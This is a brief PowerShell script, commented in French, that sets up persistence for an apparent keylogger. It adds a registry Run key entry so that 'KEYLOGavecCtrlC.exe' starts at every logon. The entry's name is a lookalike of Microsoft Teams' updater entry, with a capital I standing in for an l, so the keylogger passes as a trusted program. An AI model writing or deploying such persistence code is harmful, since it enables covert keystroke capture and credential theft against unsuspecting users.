#$SID = (Get-LocalUser | Select-Object -First 1).SID.Value
#"HKEY_USERS\$SID\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
#$registryPath = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
#New-ItemProperty -Path "$registryPath\$valueName" -Name "(Default)" -PropertyType String -Value $valueData


$valueName = "com.squirreI.Teams.Teams"
$valueData = "C:\Users\22mat\Documents\asmpakpak\test keycapture\KEYLOGavecCtrlC.exe"

# Créez la nouvelle valeur de chaîne dans la clé du registre
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $valueName -Value $valueData -PropertyType "String"
